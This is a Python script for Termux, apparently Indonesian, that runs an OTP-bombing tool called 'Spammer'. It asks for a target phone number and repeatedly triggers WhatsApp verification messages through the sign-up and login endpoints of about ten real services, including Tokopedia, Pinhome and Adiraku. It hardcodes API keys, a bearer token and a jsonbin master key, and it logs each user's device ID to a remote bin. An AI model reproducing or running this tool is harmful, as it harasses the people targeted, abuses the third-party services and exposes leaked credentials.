#!/usr/bin/env python3

import os
import sys
import json
import signal
import re
import random
import time
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

a = "\033[1;30m"
m = "\033[1;31m"
h = "\033[1;32m"
k = "\033[1;33m"
c = "\033[1;36m"
p = "\033[1;37m"
r = "\033[0m"

APIKEY_BIN = "$2a$10$Bd/MzlAhne/EPWeWclNcleiH7/1rl7fKmimtXSDZYWs68JgoqCIHW"
BIN_ID = "69eb38f2856a682189699ae6"
URL_BIN = f"https://api.jsonbin.io/v3/b/{BIN_ID}"
SESSION_FILE = "/data/data/com.termux/files/home/.free_otp_session.json"
sesi_file = f"{os.path.expanduser('~')}/.session_free.lock"

deviceid = ""
ipaddress = ""
merekhp = ""
os_hp = ""
cpu = ""
memory = ""

def spam_otp_codex(length):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def spam_otp_nilai(response, start, end):
    try:
        idx = response.find(start)
        if idx == -1:
            return None
        idx += len(start)
        tail = response[idx:]
        end_idx = tail.find(end)
        if end_idx == -1:
            return None
        return tail[:end_idx]
    except:
        return None

def format_nomor(nomor):
    nomor = nomor.strip().replace(" ", "").replace("-", "")
    if nomor.startswith("0"):
        phone = "+62" + nomor[1:]
        username = "0" + nomor[1:]
    elif nomor.startswith("62"):
        phone = "+" + nomor
        username = "0" + nomor[2:]
    elif nomor.startswith("+62"):
        phone = nomor
        username = "0" + nomor[3:]
    else:
        phone = "+62" + nomor
        username = "0" + nomor
    return phone, username

def spam_otp_adiraku(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor
        url = "https://prod.adiraku.co.id/ms-auth/auth/generate-otp-vdata"
        headers = {"Content-Type": "application/json; charset=utf-8"}
        payload = {"mobileNumber": nomor_lokal, "type": "prospect-create", "channel": "whatsapp"}
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return spam_otp_nilai(resp.text, '{"message":"', '","') == "success"
    except:
        return False

def spam_otp_tokopedia(nomor):
    try:
        session = requests.Session()
        url_token = f"https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn={nomor}&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister"
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        resp = session.get(url_token, headers=headers, timeout=10)
        token = re.search(r'<input\s+id="Token"\s+value="([^"]+)"', resp.text)
        if not token:
            return False
        url_otp = "https://accounts.tokopedia.com/otp/c/ajax/request-wa"
        data = {
            "otp_type": "116",
            "msisdn": nomor,
            "tk": token.group(1),
            "email": "",
            "original_param": "",
            "user_id": "",
            "signature": "",
            "number_otp_digit": "6"
        }
        headers["Content-Type"] = "application/x-www-form-urlencoded; charset=UTF-8"
        headers["X-Requested-With"] = "XMLHttpRequest"
        resp2 = session.post(url_otp, data=data, headers=headers, timeout=10)
        return resp2.status_code == 200
    except:
        return False

def spam_otp_singa(nomor):
    try:
        url = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id="
        payload = {"mobile_phone": nomor, "type": "mobile", "is_switchable": 1}
        headers = {"Content-Type": "application/json; charset=utf-8"}
        res = requests.post(url, json=payload, headers=headers, timeout=10)
        return spam_otp_nilai(res.text, '"msg":"', '","') == "Success"
    except:
        return False

def spam_otp_pinhome(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor
        url = "https://www.pinhome.id/api/pinaccount/request/otp"
        headers = {
            "Host": "www.pinhome.id",
            "Accept": "application/json",
            "Authorization": "Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
            "Origin": "https://www.pinhome.id"
        }
        payload = {
            "accountType": "customers",
            "countryCode": "62",
            "medium": "whatsapp",
            "otpType": "register",
            "phoneNumber": nomor_lokal
        }
        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400
    except:
        return False

def spam_otp_duniagames(nomor):
    try:
        phone, username = format_nomor(nomor)
        session = requests.Session()
        url = "https://api.duniagames.co.id/api/user/api/v2/user/send-otp"
        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id",
            "ciam-type": "FR",
            "content-type": "application/json",
            "origin": "https://duniagames.co.id",
            "referer": "https://duniagames.co.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-device": "1ee352b7-d541-418f-a7b9-82d9358ea6a4"
        }
        payload = {"phoneNumber": phone, "userName": username}
        resp = session.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False
        
def spam_otp_acc(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor

        session = requests.Session()
        
        url = "https://www.acc.co.id/register/new-account"
        
        headers = {
            "Accept": "text/x-component",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "Connection": "keep-alive",
            "Content-Type": "text/plain;charset=UTF-8",
            "Host": "www.acc.co.id",
            "next-action": "7f4271400eb36624563cc4172891e0c821039f2fca",
            "next-router-state-tree": "%5B%22%22%2C%7B%22children%22%3A%5B%22(auth)%22%2C%7B%22children%22%3A%5B%22register%22%2C%7B%22children%22%3A%5B%22new-account%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2Cnull%2Cnull%5D%7D%5D%7D%5D%7D%5D%2Cnull%2Cnull%5D%7D%5D%2Cnull%2Cnull%5D%7D%5D%2Cnull%2Cnull%5D%2Cnull%2Ctrue%5D",
            "Origin": "https://www.acc.co.id",
            "Referer": "https://www.acc.co.id/register/new-account",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
        }
        
        payload = f'[{{"user_id":null,"action":"register","send_to":"{nomor_lokal}","provider":"whatsapp"}}]'
        
        resp = session.post(url, data=payload, headers=headers, timeout=10)
        return resp.status_code == 200
    except:
        return False
        
def spam_otp_absenku(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()

        session.get(
            "https://registrasi.absenku.com/index.php/register/index/2",
            headers={
                "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            },
            timeout=10
        )

        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/x-www-form-urlencoded",
            "referer": "https://registrasi.absenku.com/index.php/register/index/2",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-requested-with": "XMLHttpRequest",
        }

        session.post(
            "https://registrasi.absenku.com/index.php/register/validasi_trial",
            data={
                "nama": "Nama Lengkap",
                "email": "email@gmail.com",
                "telp": nomor,
                "company_name": "PT Test",
                "jumlah": "10",
                "tujuan": "1",
                "paket": "21",
                "ci_csrf_token": ""
            },
            headers=headers,
            timeout=10
        )

        resp = session.get(
            "https://registrasi.absenku.com/index.php/register/ajax_detik_otp",
            params={"telp": nomor},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400
    except:
        return False
        
def spam_otp_pinhome(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor

        url = "https://www.pinhome.id/api/pinaccount/request/otp"

        headers = {
            "Host": "www.pinhome.id",
            "Accept": "application/json",
            "Authorization": "Bearer 13d2886acc908192d0c33325b44a617e5e3395481cc03cbfd67de34886399731",
            "Content-Type": "application/json",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10)",
            "Origin": "https://www.pinhome.id"
        }

        payload = {
            "accountType": "customers",
            "countryCode": "62",
            "medium": "whatsapp",
            "otpType": "register",
            "phoneNumber": nomor_lokal
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code < 400

    except:
        return False
        
def spam_otp_saturdays(nomor):
    try:
        if nomor.startswith("62"):
            nomor_lokal = "0" + nomor[2:]
        else:
            nomor_lokal = nomor

        url = "https://beta.api.saturdays.com/api/v1/user/otp/send"

        headers = {
            "accept": "*/*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "authorization": "undefined",
            "content-type": "application/json",
            "country-code": "ID",
            "currency-code": "IDR",
            "device-type": "mweb",
            "origin": "https://saturdays.com",
            "referer": "https://saturdays.com/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": "Android",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "platform": "mweb",
            "x-api-key": "GCMUDiuY5a7WvyUNt9n3QztToSHzK7Uj"
        }

        payload = {
            "number": nomor_lokal,
            "country_code": "+62",
            "type": ""
        }

        resp = requests.post(url, json=payload, headers=headers, timeout=10)
        return resp.status_code == 200

    except:
        return False
        
def spam_otp_maulagi(nomor):
    try:
        if nomor.startswith("62"):
            nomor = "0" + nomor[2:]

        session = requests.Session()

        headers = {
            "accept": "application/json, text/plain, */*",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "content-type": "application/json",
            "origin": "https://maulagi.id",
            "referer": "https://maulagi.id/",
            "sec-ch-ua": '"Chromium";v="107", "Not=A?Brand";v="24"',
            "sec-ch-ua-mobile": "?1",
            "sec-ch-ua-platform": '"Android"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Linux; Android 14; itel A671LC) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36",
            "x-ml-key": "E32VCHXX32"
        }

        resp = session.post(
            "https://api.maulagi.id/api/v2/auth/check",
            json={"credentials": nomor},
            headers=headers,
            timeout=10
        )

        return resp.status_code < 400
    except:
        return False

def mulai_spam(nomor):
    apis = {
        "adiraku": spam_otp_adiraku,
        "tokopedia": spam_otp_tokopedia,
        "singa": spam_otp_singa,
        "pinhome": spam_otp_pinhome,
        "duniagames": spam_otp_duniagames,
        "acc": spam_otp_acc,
        "absenku": spam_otp_absenku,
        "pinhome": spam_otp_pinhome,
        "saturdays": spam_otp_saturdays,
        "maulagi": spam_otp_maulagi
        
    }
    with ThreadPoolExecutor(max_workers=len(apis)) as executor:
        futures = {executor.submit(fungsi, nomor): nama for nama, fungsi in apis.items()}
        for future in as_completed(futures):
            try:
                future.result()
            except:
                pass

def simpan_sesi(nomor, waktu_kirim):
    try:
        with open(SESSION_FILE, "w") as f:
            json.dump({"nomor": nomor, "waktu_kirim": waktu_kirim}, f)
    except:
        pass

def baca_sesi():
    try:
        with open(SESSION_FILE, "r") as f:
            return json.load(f)
    except:
        return None

def hapus_sesi_otp():
    try:
        os.remove(SESSION_FILE)
    except:
        pass

def kontol_sinyal(sig, frame):
    return

def spam_countdown(waktu_kirim, detik=5):
    def handler(sig, frame):
        raise KeyboardInterrupt
    signal.signal(signal.SIGINT, handler)
    try:
        while True:
            sisa = detik - int(time.time() - waktu_kirim)
            if sisa <= 0:
                break
            menit = sisa // 60
            detik_sisa = sisa % 60
            waktu = f"{menit:02d}.{detik_sisa:02d}"
            sys.stdout.write(f"\r{a}╭─────────────────────────────────────────────────────────────╮\n")
            sys.stdout.write(f"{a}│{p} {h}🜲{p} Otp Successfully Terkirim{' '*31}{a}  │\n")
            sys.stdout.write(f"{a}│{p} {h}⏱{p} Mengirim Ulang Dalam : {h}{waktu}{' '*(29-len(waktu))}      {a}│\n")
            sys.stdout.write(f"{a}╰───────────────────{m}>> {h}CTRL {p}+{h} C {p}For Exit{a} {m}<<{a}───────────────────╯{r}")
            sys.stdout.flush()
            sys.stdout.write("\033[3A")
            time.sleep(1)
        sys.stdout.write("\n\n\n\n")
    finally:
        signal.signal(signal.SIGINT, kontol_sinyal)

def get_devid():
    try:
        result = os.popen('whoami').read().strip()
        if result:
            return result
        uid = os.getuid()
        return f"u0_a{uid}"
    except:
        return "unknown"

def cek_sesi():
    if os.path.exists(sesi_file):
        try:
            with open(sesi_file, 'r') as f:
                pid = int(f.read().strip())
            try:
                os.kill(pid, 0)
                return True
            except OSError:
                os.remove(sesi_file)
                return False
        except (ValueError, FileNotFoundError):
            try:
                os.remove(sesi_file)
            except:
                pass
            return False
    return False

def buat_sesi():
    try:
        with open(sesi_file, 'w') as f:
            f.write(str(os.getpid()))
    except:
        pass

def hapus_sesi():
    try:
        if os.path.exists(sesi_file):
            os.remove(sesi_file)
    except:
        pass

def get_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        return response.json()["ip"]
    except:
        return "N/A"

def sensor_ip(ip):
    try:
        if ip == "N/A" or len(ip) < 5:
            return ip
        return ip[:-5] + "×" * 5
    except:
        return ip

def get_merek_hp():
    try:
        brand = os.popen('getprop ro.product.brand').read().strip()
        if brand:
            return brand
        return "Unknown"
    except:
        return "Unknown"

def get_os():
    try:
        os_version = os.popen('getprop ro.build.version.release').read().strip()
        if os_version:
            return f"Android {os_version}"
        return "Unknown"
    except:
        return "Unknown"

def get_cpu():
    try:
        cpu_count = os.popen('cat /proc/cpuinfo | grep "processor" | wc -l').read().strip()
        max_freq = os.popen('cat /sys/devices/system/cpu/cpu0/cpufreq/cpuinfo_max_freq').read().strip()
        if max_freq:
            freq_ghz = round(int(max_freq) / 1000000, 3)
        else:
            freq_ghz = "?"
        if cpu_count:
            return f"({cpu_count}) @ {freq_ghz}GHz"
        return "Unknown"
    except:
        return "Unknown"

def get_memory():
    try:
        meminfo = os.popen('cat /proc/meminfo | grep MemTotal').read().strip()
        if meminfo:
            mem_kb = int(meminfo.split()[1])
            mem_gb = round(mem_kb / (1024 * 1024), 2)
            return f"{mem_gb} GB"
        return "Unknown"
    except:
        return "Unknown"

def jumlah_pengguna():
    try:
        headers = {"X-Master-Key": APIKEY_BIN, "X-Bin-Meta": "false"}
        response = requests.get(f"{URL_BIN}/latest", headers=headers, timeout=10)
        if response.status_code == 200:
            data = response.json()
            return len(data.get("users", []))
        return 0
    except:
        return 0

def daftar_pengguna_baru(device_id):
    try:
        headers = {"X-Master-Key": APIKEY_BIN, "X-Bin-Meta": "false"}
        response = requests.get(f"{URL_BIN}/latest", headers=headers, timeout=10)
        if response.status_code != 200:
            return
        data = response.json()
        users = data.get("users", [])
        for user in users:
            if user.get("device_id") == device_id:
                return
        users.append({
            "device_id": device_id,
            "tanggal_daftar": time.strftime("%d-%m-%Y %H:%M:%S")
        })
        update_headers = {
            "X-Master-Key": APIKEY_BIN,
            "Content-Type": "application/json"
        }
        requests.put(URL_BIN, json={"users": users}, headers=update_headers, timeout=10)
        time.sleep(0.5)
    except:
        pass

def up_to_prem():
    print(f"""
{a}╭─────────────────────────────────────────────────────────────╮
{a}│{p} Keuntungan Status Premium:                                  {a}│
{a}│{h} -{p} 30 Otp Masuk Ke WhatsApp                                 {a} │
{a}│{h} -{p} 3 Otp Masuk Ke Sms                                        {a}│
{a}│{h} -{p} 2 Otp Masuk Lewat Penggilan Telepon                       {a}│
{a}│{h} -{p} Fitur Spam NGL                                            {a}│
{a}│{h} -{p} Fitur Spam Gmail                                          {a}│
{a}│{h} -{p} Fitur Spam Telegram                                       {a}│
{a}│{h} -{p} Dan Lain Lain...                                          {a}│
{a}╰─────────────────────────────────────────────────────────────╯
{a}╭─────────────────────────────────────────────────────────────╮
{a}│{h} - {p}Upgrade ke status Premium dikenakan biaya sebesar Rp25k   {a}│
{a}│{h} - {p}Status Premium berlaku permanen untuk 1 User ID.          {a}│
{a}│{h} - {p}User ID dapat berubah apabila Anda menghapus aplikasi     {a}│
{a}│   {p}Termux.                                                   {a}│
{a}│{h} - {p}Status Premium pada User ID sebelumnya tidak dapat        {a}│
{a}│   {p}digunakan kembali jika terjadi perubahan User ID.         {a}│
{a}│                                                             │
{a}│{p} Klik{h} OK {p}Untuk Chat Admin atau Enter Tanpa Isi Apapun        {a}│
{a}╰── ╭──── ────────────────────────────────────────────────────╯""")
    input_up_to_prem = input(f"{a}    ╰──{h}➤{p} ")

    if input_up_to_prem == "ok" or input_up_to_prem == "OK":
        os.system("xdg-open 'https://chat.whatsapp.com/LmotKeBkzV0BwY0gFkH3VT?s=cl&p=a&mlu=0'")
    else:
        return

def clear():
    os.system('clear')

def tampilkan_menu():
    user = jumlah_pengguna()
    merekhp = get_merek_hp()
    os_hp = get_os()
    cpu = get_cpu()
    memory = get_memory()
    ip_sensor = sensor_ip(ipaddress)

    jarak_ip = " " * (23 - len(str(ip_sensor)))
    jarak_id = " " * (22 - len(str(deviceid)))
    jarak_user = " " * (23 - len(str(user)))
    jarak_merekhp = " " * (21 - len(str(merekhp)))
    jarak_oshp = " " * (21 - len(str(os_hp)))
    jarak_cpu = " " * (19 - len(str(cpu)))
    jarak_memory = " " * (14 - len(str(memory)))

    clear()
    print(f"""{a}
╭─────────────────────────────────────────────────────────────╮
│\033[1;35m  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                    {a} │
│\033[1;35m  ⠀⠀⠀⠀⠀⠀⢀⣠⣤⠞⢹⡏⠳⣤⣄⡀⠀⠀⠀⠀⠀⠀ {h}┌─┐┌┬┐┌─┐       ┌┐┌┌─┐─┐ ┬┬ ┬┌─┐   {a} │
│\033[1;35m  ⠰⣤⣀⠀⢀⡴⣫⣴⡇⠀⢸⡇⠀⠈⢦⣝⢦⡀⠀⣀⣤⠆ {h}│ │││││ ┬  {m}───{h}  │││├┤ ┌┴┬┘│ │└─┐   {a} │
│\033[1;35m  ⠀⢷⠀⠉⠛⠾⣿⣿⡇⠀⢸⡇⠀⢀⠀⠙⠷⠛⠉⠀⡾⠀ {h}└─┘┴ ┴└─┘       ┘└┘└─┘┴ └─└─┘└─┘   {a} │
│\033[1;35m  ⠀⠘⡄⠀⢠⡀⠀⢿⡇⠀⢸⡇⠀⠈⠉⠀⣀⡄⠀⢠⠃⠀{a}──────────────────────────────────  {a} │
│\033[1;35m  ⠀⠀⢳⡀⠀⣷⠀⠘⡇⠀⢸⡇⡀⢤⣶⣿⠟⠀⢀⡞⠀⠀                                    {a} │
│\033[1;35m  ⠀⠀⠈⣟⣦⠸⡆⠀⠁⠀⢸⡏⠀⢸⠿⠁⠀⣴⣻⠁⠀  {h} ꫝ{p} Author  {m}: {k}Bimz Modz            {a} │
│\033[1;35m  ⠀⠀⠀⠹⣌⢷⣿⡀⠀⠀⢸⡇⠀⠈⠀⣠⡾⣡⠏⠀⠀⠀ {h} ꫝ{p} Name    {m}: {k}Spammer               {a} │
│\033[1;35m  ⠀⠀⠀⠀⠈⠳⣝⠣⡄⠀⢸⡇⠀⢠⠜⣫⠞⠁     {h} ꫝ{p} Version {m}: {h}1.1.6                 {a} │
│\033[1;35m  ⠀⠀⠀⠀⠀⠀⠈⠙⠛⢦⣸⡇⡴⠛⠋⠁⠀      {h} ꫝ{p} Users   {m}: {h}{user}{jarak_user}{a}│
│\033[1;35m  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠏⠀⠀⠀⠀⠀                                         {a} │
╰─────────────────────────────────────────────────────────────╯
╭──────────────────────────────╮╭─────────────────────────────╮
│ {h}IP {m}:{p} {ip_sensor}{jarak_ip}{a} ││ {h}NAME   {m}:{p} Anonymous          {a}│
│ {h}ID {m}:{p} {deviceid}{jarak_id} {a} ││ {h}STATUS {m}:{p} Gratisan           {a}│
╰──────────────────────────────╯╰─────────────────────────────╯
                         {m}[{p} D E VI C E {m}]
{a}╭──────────────────────────────╮╭─────────────────────────────╮
{a}│{h} OS   {m}:{p} {os_hp}{jarak_oshp} {a}││{h} CPU   {m} :{p} {cpu}{jarak_cpu}{a}│
{a}│{h} HOST{m} :{p} {merekhp}{jarak_merekhp} {a}││ {h}MEMORY {m}:{p} {memory}{jarak_memory}{a}     │
{a}╰──────────────────────────────╯╰─────────────────────────────╯

\033[107m{a}Bimz Modz | OMG-NEXUS V 1.0.0 | CYBER EDITION | ENJOY! {r}
{a}
╭──────────────────────── {m}[ {p}M E N U {m}]{a} ────────────────────────╮
│                                                             {a}│
│ {p}[{h}01{p}] Spam OTP WhatsApp                                      {a}│
│ {p}[{h}02{p}] Community                                     {a}│
│ {p}[{h}03{p}] Support (Saweria)                                {a}│
│ {p}[{h}00{p}] Keluar                                                 {a}│
│                                                             {a}│
╰── ╭─ {m}[{p} P I L I H {m}]{a} ─────────────────────────────────────────╯""")

def spam_otp_main():
    print(f"""{a}
╭─────────────────────────────────────────────────────────────╮
│{p} Masukkan Nomor Target Format Nasional. Contoh{m}: {h}08×××××××××× {a}│
╰── ╭─ {m}[{p} N O M O R{m} ]{a} ─────────────────────────────────────────╯""")

    nomor = input(f"    {a}╰──{h}➤{p} ").strip()
    print()

    if not nomor:
        input(f"{p} [{m}!{p}] Nomor tidak boleh kosong!{p} {m}|{h} ENTER{r}")
        return

    if nomor.startswith("0"):
        nomor = "62" + nomor[1:]
    elif nomor.startswith("+62"):
        nomor = nomor[1:]
    elif nomor.startswith("62"):
        pass
    else:
        nomor = "62" + nomor

    try:
        sesi = baca_sesi()
        if sesi and sesi.get("nomor") == nomor:
            waktu_kirim = sesi.get("waktu_kirim")
            sisa = 5 - int(time.time() - waktu_kirim)
            if sisa > 0:
                spam_countdown(waktu_kirim, 5)

        while True:
            mulai_spam(nomor)
            waktu_kirim = time.time()
            simpan_sesi(nomor, waktu_kirim)
            spam_countdown(waktu_kirim, 5)
            hapus_sesi_otp()

    except KeyboardInterrupt:
        sys.stdout.write("\n\n\n\n")
        print(f"\n{p} [{h}+{p}] Kembali Ke Menu...{r}")
        time.sleep(1)
        return

def menu_utama():
    while True:
        tampilkan_menu()
        try:
            pilihan = input(f"{a}    ╰──{h}➤{p} ").strip()
            if pilihan == '1':
                spam_otp_main()
            elif pilihan == '2':
                up_to_prem()
            elif pilihan == '3':
                os.system("xdg-open 'https://saweria.co/BimaGigu'")
            elif pilihan == '0':
                break
            else:
                input(f"\n {p}[{m}!{p}] Pilihan tidak valid{m} | {h}ENTER{r}")
        except (EOFError, KeyboardInterrupt):
            continue

def main():
    global deviceid, ipaddress

    signal.signal(signal.SIGTSTP, kontol_sinyal)

    if cek_sesi():
        clear()
        print(f"""{a}
╭───────────────────────────────────────────────────────────╮
│\033[1;35m  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                      {a}│
│\033[1;35m  ⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                               {a}│
│\033[1;35m  ⠀⠀⠀⠀⢀⡆⠀⠀⢠⣷⠀⠀⠀⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                               {a}│
│\033[1;35m  ⠀⠀⠀⢠⣾⠀⠀⠀⢸⣿⠀⠀⠀⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                               {a}│
│\033[1;35m  ⠀⠀⠠⢿⡿⠀⠀⠀⢸⣿⠀⠀⠀⢸⣿⢦⡀⠀⠀  {h}┌┐┌┌─┐─┐ ┬┬ ┬┌─┐       {h}┌─┐┌─┐┌─┐⠀⠀⠀ {a}│
│\033[1;35m  ⠀⠀⠀⣿⡇⠀⠀⠀⣿⣿⡇⠀⠀⠀⣿⡄⠀⠀⠀  {h}│││├┤ ┌┴┬┘│ │└─┐  {m}───  {h}└─┐├┤ │      {a}│
│\033[1;35m  ⠀⠀⢰⣿⠁⠀⠀⠀⣿⣿⡇⠀⠀⠀⢹⣷⠀⠀⠀  {h}┘└┘└─┘┴ └─└─┘└─┘       {h}└─┘└─┘└─┘    {a}│
│\033[1;35m  ⠀⢀⣿⡟⠀⠀⠀⢀⣿⣿⣟⠀⠀⠀⢸⣿⡇⠀⠀ {a}──────────────────────────────────   {a}│
│\033[1;35m  ⠀⢸⣿⡇⠀⣀⡤⢸⣿⣿⣿⢠⣄⡀⠈⣿⣧⠀⠀⠀⠀                                    {a}│
│\033[1;35m   ⣾⣿⣿⣿⣿⡇⢸⣿⣿⣿⠘⣿⣿⣿⣿⣿⡇⠀ ⠀ {a}╭───────── {m}[{p} 安全 {m}]{a} ─────────╮     {a}│
│\033[1;35m  ⣸⣿⣿⣿⣿⡿⠇⣿⣿⣿⣿⡇⠿⣿⣿⣿⣿⣿⠀⠀ ⠀{a}│ {p}Kejanggalan Terdeteksi⠀⠀   {a}│     {a}│
│\033[1;35m  ⠿⠟⠛⠉⠀⠀⠀⠘⣿⣿⡿⠀⠀⠀⠉⠙⠛⠿⠇⠀⠀ {a}│ {p}Harap Matikan Hal Yang     {a}│     {a}│
│\033[1;35m  ⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}│ {p}Dapat Mengganggu Script! ⠀⠀{a}│     {a}│
│\033[1;35m ⠀ ⠀⠀⠀⠀⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀ {a}╰────────────────────────────╯     {a}│
╰───────────────────────────────────────────────────────────╯
""")
        sys.exit()

    deviceid = get_devid()
    ipaddress = get_ip()

    daftar_pengguna_baru(deviceid)

    buat_sesi()

    clear()

    try:
        menu_utama()
    except Exception as e:
        print(f"\n {p}[{m}!{p}] Error{m}:{a} {e}")
        sys.exit(1)
    finally:
        hapus_sesi()

if __name__ == "__main__":
    os.system("clear")
    print("Script Sedang Dijalankan, Tunggu Sampai 10-30 Detik")
    os.system("xdg-open 'https://chat.whatsapp.com/LmotKeBkzV0BwY0gFkH3VT?s=cl&p=a&mlu=0'")
    time.sleep(2)
    main()
